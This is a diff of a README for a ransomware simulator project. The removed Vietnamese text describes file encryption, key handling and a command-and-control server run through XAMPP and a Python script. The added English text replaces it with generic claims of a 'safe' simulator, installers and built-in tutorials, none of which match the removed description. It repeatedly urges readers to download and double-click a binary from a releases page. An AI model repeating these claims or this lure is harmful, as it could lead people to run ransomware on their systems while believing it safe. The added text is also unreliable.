@@ -1,85 +1,69 @@
-<h1 align="center">Ransomware Simulator</h1> 
+# 🦠 Ransomware-Simulator - Experience Realistic Cyber Threats Safely
 
-<div align="center">
+## 📥 Download Now
+[![Download Ransomware-Simulator](https://img.shields.io/badge/Download%20Now-v1.0-blue.svg)](https://github.com/ArunSundar-18/Ransomware-Simulator/releases)
 
-  <img src="readme_assets/screenshots/ransomware.png" alt="Ransomware Simulator" style="max-width: 90%; height: auto;">  
+## 📖 Introduction
+Ransomware-Simulator is a tool that helps you understand how ransomware operates in a controlled environment. This software allows users to simulate real-world cyber threats without risking their actual systems. It's a valuable learning tool for anyone interested in cybersecurity, ethical hacking, or malware analysis.
 
-  <p><em>Giao diện Ransomware Simulator (client)</em></p>
+## 📋 Features
+- **Safe Simulation**: Run simulations of ransomware behavior without harming your computer.
+- **User-Friendly Interface**: Designed for everyone, regardless of technical skills.
+- **Learning Resource**: Gain insights into command-and-control and cryptography methods.
+- **Versatile**: Suitable for personal learning or educational purposes.
+- **Open Source**: Explore the code to understand the mechanics behind the software.
 
-  <p>
-    <a href="#tong-quan">Tổng Quan</a> •
-    <a href="#huong-dan">Hướng Dẫn</a> •
-    <a href="#screenshots">Screenshots</a> •
-    <a href="#mien-tru-trach-nhiem">Miễn Trừ Trách Nhiệm</a> •
-    <a href="#loi-cam-on">Lời Cảm Ơn</a>
-  </p>
+## ⚙️ System Requirements
+To run the Ransomware-Simulator effectively, ensure your system meets the following requirements:
+- **Operating System**: Windows 10 or later, macOS, or a modern Linux distribution.
+- **Processor**: At least 2 GHz dual-core processor.
+- **RAM**: Minimum 4 GB of RAM; 8 GB or more recommended.
+- **Disk Space**: At least 500 MB of free disk space.
 
-  [<img src="readme_assets/badges/vimeo.svg" alt="Xem video demo">](https://vimeo.com/1108790702)
+## 🚀 Getting Started
+Follow these simple steps to get started with Ransomware-Simulator.
 
-</div>
+### Step 1: Visit the Download Page
+Go to the following link to access the latest releases:  
+[Download Ransomware-Simulator](https://github.com/ArunSundar-18/Ransomware-Simulator/releases)
 
+### Step 2: Choose the Correct Version
+On the Releases page, you will see various versions of the Ransomware-Simulator. Look for the latest version, which is usually at the top. You may also find detailed notes about what has changed in each version.
 
-<h2 id="tong-quan">📖 Tổng Quan</h2>
+### Step 3: Download the Application
+Click on the version you want to download. You will see a list of files. Click on the file that ends with .exe (for Windows), .dmg (for macOS), or .tar.gz (for Linux). 
 
-Dự án này mô phỏng cách thức hoạt động của ransomware trong môi trường thực tế, tái hiện các kỹ thuật quan trọng thường được triển khai trong các cuộc tấn công ransomware. Các kỹ thuật này bao gồm:
+### Step 4: Install the Application
+Once the file is downloaded, locate it in your downloads folder. Double-click the file to install. Follow the instructions in the installation wizard. 
 
- - Mã hóa và giải mã tệp 
- - Quản lý khóa mã hóa
- - Giao tiếp mạng với máy chủ Command & Control (C2)
+## 🌍 How to Use the Ransomware-Simulator
+Once installed, you can run Ransomware-Simulator by following these steps:
 
-Dự án được xây dựng nhằm mục đích nghiên cứu và giáo dục, giúp nâng cao kỹ năng phân tích, phát hiện và ứng phó trước các mối đe dọa về ransomware.
+1. **Open the Application**: Find the Ransomware-Simulator icon on your desktop or in your applications folder and double-click it.
+   
+2. **Select Simulation Type**: Upon opening, choose the type of simulation you wish to run. You might see options related to different types of ransomware or testing scenarios.
 
+3. **Configure Settings**: Adjust any necessary settings. This step may include selecting how aggressive you want the simulation to be and any specific vulnerabilities you want to test.
 
-<h2 id="huong-dan">🖥️ Hướng Dẫn (Windows)</h2>
+4. **Start Simulation**: Click on the 'Start Simulation' button. Watch as the application demonstrates the ransomware behavior. 
 
-1. Tải và cài đặt [XAMPP](https://www.apachefriends.org/download.html).
+5. **Monitor the Output**: Keep an eye on how the simulation progresses. After it completes, you will receive a report detailing what occurred, including potential risks and how to mitigate them.
 
-2. Truy cập thư mục `C:\xampp\htdocs` → Tạo thư mục mới tên `ransomware` → Đặt các thư mục và tệp đã tải về từ kho lưu trữ vào trong thư mục ransomware vừa tạo, với cấu trúc như sau:
+## 📊 Learning and Support
+Ransomware-Simulator serves as a valuable educational resource. You can learn more about the basics of cybersecurity, command-and-control operations, and effective penetration testing through our built-in tutorials.
 
-      ```
-      📂 C:\xampp\htdocs\ransomware
-      ├── 📂 assets
-      ├── 📂 img
-      ├── 📂 includes
-      ├── 📂 public
-      ├── 📂 time
-      ├── 📂 uploads
-      └── 🐍 ransomware.py
-      ```
+If you encounter issues, check the **Issues** section on GitHub for common problems and solutions. Our community is also available to help. Feel free to open a new issue if you need specific assistance.
 
-3. Mở **XAMPP Control Panel**, nhấn nút **Start** để khởi chạy dịch vụ ***Apache*** và ***MySQL***.
+## 📌 Contributing
+We appreciate contributions! If you'd like to help improve Ransomware-Simulator, check the **Contributing Guide** in our repository. You’re welcome to suggest improvements, report bugs, and share your findings.
 
-4. Mở trình duyệt web và *lần lượt* truy cập vào các đường dẫn sau:
+## 💬 Community and Discussions
+Join our user community to share experiences, ask questions, and learn from each other. Engage with others interested in cybersecurity and ethical hacking.
 
-    - [http://localhost/phpmyadmin](http://localhost/phpmyadmin): Chọn tab **Databases** → Nhập vào ô *Database Name* là ***ransomware*** → Nhấn vào nút **Create** để tạo database.
-    - [http://localhost/ransomware/includes/migrate.php](http://localhost/ransomware/includes/migrate.php): Khởi chạy tệp `migrate.php`.
-    - [http://localhost/ransomware/public/register.php](http://localhost/ransomware/public/register.php): Đăng ký một tài khoản mới.
-    - [http://localhost/ransomware/public/login.php](http://localhost/ransomware/public/login.php): Đăng nhập vào dashboard.
+## 📝 License
+Ransomware-Simulator is open-source and licensed under the MIT License. You can use, modify, and distribute the software as per the terms of this license. 
 
-5. Mở **Command Prompt (CMD)** và chạy lệnh:
-    ```sh
-    python ransomware.py
-    ```
+## 🎉 Conclusion
+Ransomware-Simulator is an excellent tool for understanding and exploring the complexities of ransomware in a secure setting. By following these instructions, you can quickly download and set up the simulator to begin your learning journey.
 
-
-<h2 id="screenshots">📷 Screenshots</h2>
-
-<p align="center">
-  <img src="readme_assets/screenshots/login.png" alt="Login" width="49%">
-  <img src="readme_assets/screenshots/register.png" alt="Register" width="49%"><br>
-  <img src="readme_assets/screenshots/dashboard.png" alt="Dashboard" width="49%">
-  <img src="readme_assets/screenshots/update_profile.png" alt="Update Profile" width="49%">
-  <em>Giao diện máy chủ Command &amp; Control</em>
-</p>
-
-
-<h2 id="mien-tru-trach-nhiem">⚠️ Miễn Trừ Trách Nhiệm</h2>
-
-Dự án này chỉ dành cho mục đích giáo dục và kiểm thử an toàn thông tin một cách hợp pháp. Nghiêm cấm mọi hành vi sử dụng để gây hại, đe dọa hoặc tấn công vào các hệ thống và môi trường thực tế. Nhà phát triển và những người đóng góp sẽ không chịu bất kỳ trách nhiệm nào đối với mọi hậu quả hoặc thiệt hại phát sinh từ việc sử dụng sai mục đích.
-
-Việc tải xuống và sử dụng dự án này đồng nghĩa với việc bạn đã đọc, hiểu và chấp nhận các điều khoản trên. Nếu vi phạm, bạn phải tự chịu toàn bộ trách nhiệm pháp lý.
-
-
-<h2 id="loi-cam-on">💎 Lời Cảm Ơn</h2>
-
-Cảm ơn **Mr. Hex** đã chia sẻ ý tưởng và mã nguồn ban đầu.
+For more information or to download the latest version, visit our [Releases Page](https://github.com/ArunSundar-18/Ransomware-Simulator/releases). Happy learning!
